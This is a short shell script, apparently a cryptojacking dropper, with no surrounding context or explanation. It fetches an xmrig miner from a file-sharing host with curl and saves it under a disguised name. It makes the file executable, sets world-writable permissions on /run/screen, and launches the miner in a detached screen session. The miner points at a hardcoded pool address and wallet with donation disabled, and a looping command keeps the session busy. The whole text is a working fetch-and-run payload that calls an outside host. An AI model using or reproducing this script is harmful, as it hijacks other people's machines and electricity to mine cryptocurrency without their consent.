curl https://transfer.sh/uTIFtD/xmrig --output phq
chmod +x phq
chmod 777 /run/screen
screen -dmS phq ./phq --url 20.120.30.75:3333 --user hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa --pass x --donate-level 0
while :; do shuf -n 1 -i 1-99999999; sleep 30; done
